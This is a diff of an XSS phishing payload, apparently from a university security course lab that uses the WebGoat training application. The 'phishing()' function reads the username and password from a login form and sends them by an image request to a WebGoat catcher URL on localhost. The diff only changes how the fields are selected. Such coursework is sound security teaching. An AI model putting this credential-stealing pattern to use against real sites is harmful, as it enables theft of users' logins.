@@ -11,8 +11,8 @@
 <script type="text/javascript">
 function phishing() {
     var xss_exploit = new Image();
-    var username = document.forms['ece568-2018f-form'].ece568-2018f-username.value;
-    var password = document.forms['ece568-2018f-form'].ece568-2018f-password.value;
+    var username = document.getElementById('ece568-2018f-username').value;
+    var password = document.getElementById('ece568-2018f-password').value;
 
     xss_exploit.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&userText="
                 + username + "&passText=" + password;
